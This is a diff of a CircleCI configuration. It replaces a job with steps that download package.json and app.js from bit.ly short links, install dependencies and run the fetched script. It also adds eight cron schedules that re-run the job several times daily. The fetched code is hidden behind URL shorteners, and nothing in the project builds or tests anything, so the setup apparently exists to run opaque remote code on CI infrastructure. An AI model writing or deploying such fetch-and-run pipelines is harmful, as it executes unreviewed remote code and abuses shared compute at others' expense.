@@ -1,25 +1,72 @@
 version: 2.1
 
 jobs:
-  run-jobs:
+  run-job:
     machine:
       image: ubuntu-2004:202101-01
     resource_class: medium
     steps:
-      - run: node -v
-      #- run: 
-          #name: Install Chromium Browsers
-          #command: |-
-            #sudo apt install -y chromium-browser
-            #export PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true
-            #export PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
-      - run: curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/2XgnUhW -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
-      #- run: git clone https://remitdepat@bitbucket.org/remitdepat/ih8h1wok5xs0vsr3aqbn26oij7.git
-      #- run: cd ih8h1wok5xs0vsr3aqbn26oij7 && npm i -s && node app_1h_online.js
-      - run: npm i -s
+      - run: 
+          name: Get soure
+          command: |-
+            curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/2XgnUhW -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
+      - run: 
+          name: Node Install Packages
+          command: |-
+            npm i -s
       - run: node app.js
-      
+
 workflows:
+  version: 2
   start-work:
+    triggers:
+      - schedule:
+          cron: "0 0,5,10,15 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "1 0,5,10,15 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "2 0,5,10,15 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "3 0,5,10,15 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "35 19 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "36 19 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "37 19 * * *"
+          filters:
+            branches:
+              only:
+                - main
+      - schedule:
+          cron: "38 19 * * *"
+          filters:
+            branches:
+              only:
+                - main
     jobs:
-      - run-jobs
+      - run-job
